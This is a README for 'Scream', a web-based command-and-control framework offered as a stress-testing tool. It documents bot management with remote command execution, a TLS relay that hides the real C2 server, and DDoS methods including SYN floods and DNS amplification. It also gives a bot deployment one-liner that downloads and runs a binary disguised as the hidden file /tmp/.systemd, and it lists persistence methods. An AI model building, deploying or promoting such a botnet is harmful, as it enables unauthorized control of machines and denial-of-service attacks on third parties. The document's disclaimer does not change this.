# Scream C2 Framework

## Overview
**Scream** is a lightweight, web-based Command and Control (C2) framework with built-in stress testing capabilities. It allows operators to manage bots, monitor activity, and perform a variety of network stress test methods through a secure, intuitive interface.

<table>
  <tr>
    <td><img src="https://github.com/user-attachments/assets/7b8e0653-1178-4499-bea2-b1340260ada6" width="100%"/></td>
    <td><img src="https://github.com/user-attachments/assets/1d5f58d1-2c5d-4a82-b203-88f5e1a5e4bc" width="100%"/></td>
  </tr>
  <tr>
    <td><img src="https://github.com/user-attachments/assets/948fb62d-5861-4963-8c15-ee110c31e21d" width="100%"/></td>
    <td><img src="https://github.com/user-attachments/assets/736a91e2-4c10-439e-9bf7-128ec9ee7841" width="100%"/></td>
  </tr>
</table>

## 🔁 TLS Proxy Module

The TLS Proxy module enables encrypted traffic forwarding between bots and the core C2 server. This acts as a secure intermediary, offering stealth, traffic redirection, and flexible network deployment strategies.

---
<table>
  <tr>
    <td><img src="https://github.com/user-attachments/assets/ecfd42c3-d606-4058-b945-3dd82b72ee77" width="100%"/></td>
  </tr>
</table>

### 🌐 Purpose
The proxy listens for incoming TLS connections from bots and securely forwards traffic to the core C2 server. This provides:
- **Obfuscation** of real C2 infrastructure
- **Traffic rerouting** through dedicated relay nodes
- **Flexible deployment** across cloud or on-prem infrastructure

---

### 🔧 Configuration (`proxy.go`)
| Constant         | Description                        | Default Value           |
|------------------|------------------------------------|-------------------------|
| `PROXY_LISTEN`   | Interface and port to listen on     | `0.0.0.0:7003`          |
| `SERVER_ADDR`    | Target C2 server address/port       | `192.168.1.50:7002`     |
| `CONNECT_TIMEOUT`| Timeout when connecting to server   | `10s`                   |
| `IO_TIMEOUT`     | I/O read/write timeout              | `30s`                   |
| `CERT_FILE`      | TLS certificate file                | `server.crt`            |
| `KEY_FILE`       | TLS private key file                | `server.key`            |

---

### 🛠 How It Works
1. Proxy starts and listens for TLS connections on the configured IP/port.
2. Once a bot connects, the proxy attempts a secure connection to the backend C2 server.
3. After both ends are connected, the proxy begins full-duplex communication using `io.Copy()`.

---

### ✅ Usage
Build and run:
```bash
go build -o proxy proxy.go
./proxy
```

## Features

### ✅ Web-Based Interface
- Real-time bot monitoring
- Attack control panel
- User management system
- Attack history tracking

### 🚀 Stress Testing Modules
- UDP Flood
- TCP Flood
- SYN Flood
- ACK Flood
- GRE Flood
- DNS Amplification
- HTTP Flood

### 🧠 Bot Management
- Auto bot connection handling
- Heartbeat & status monitoring
- Hardware resource reporting
- Remote command execution

### 🔐 Security
- Challenge-response authentication
- TLS encrypted communication
- Session & password management
- Enforced password complexity

---

## Installation

### Requirements
- Go 1.18+ installed
- Root access to a Linux server
- Domain name (recommended for SSL)

### Quick Setup

1. **Clone the repository**
   ```bash
   git clone https://github.com/yourusername/scream-c2.git
   cd scream-c2
   ```

2. **Build server and bot**
   ```bash
   go build -o server main.go
   go build -o bot bot.go
   ```

3. **Generate SSL certificates**
   ```bash
   ./server --gen-cert
   ```

4. **Run the server**
   ```bash
   ./server
   ```

5. **Deploy bots to desired systems**

---

## Configuration

### Server Settings (`main.go`)
```go
const (
    USERS_FILE      = "users.json"
    BOT_SERVER_IP   = "0.0.0.0"
    BOT_SERVER_PORT = "7003"
    WEB_SERVER_IP   = "0.0.0.0"
    WEB_SERVER_PORT = "443"
    CERT_FILE       = "server.crt"
    KEY_FILE        = "server.key"
)
```

### Bot Settings (`bot.go`)
```go
const (
    C2Address = "your.server.ip:7003"
)
```

---

## Usage

### Web Dashboard
- Visit: `https://your-server-ip`
- Default Login:
  - **Username**: `root`
  - **Password**: *(auto-generated, shown on first run)*

### Manage Bots
- View all connected bots and their statuses
- Access detailed hardware/resource reports
- Execute remote commands

### Launch Attacks
1. Select a method
2. Enter target details
3. Define duration
4. Click **"Initiate Attack Sequence"**

### Manage Users
- Create, delete, or modify users (Admin role only)

---

## Deployment Options

### Linux Bot Deployment
```bash
curl http://your-server-ip/bot -o /tmp/.systemd && chmod +x /tmp/.systemd && /tmp/.systemd
```

### Persistence Methods
- Systemd service
- Cron job
- File lock to prevent deletion

---

## Troubleshooting

### Bots not connecting?
- Double-check `C2Address` in the bot binary
- Ensure server ports are open and listening
- Review firewall or security group settings

### Web interface not loading?
- Verify SSL certificate paths
- Confirm port 443 is accessible
- Check server logs for errors

### Attacks not effective?
- Confirm target IP/hostname and port
- Ensure bots are online
- Verify method compatibility

---

## Security Best Practices
⚠️ **Important:**
- Change the default `root` password immediately
- Use strong, unique passwords for all users
- Restrict dashboard access (VPN, firewall, etc.)
- Keep the system and Go packages updated
- Regularly audit bot activity and logs

---

## License
**For educational and research purposes only.**  
The authors are **not responsible** for any misuse or unauthorized use of this tool.
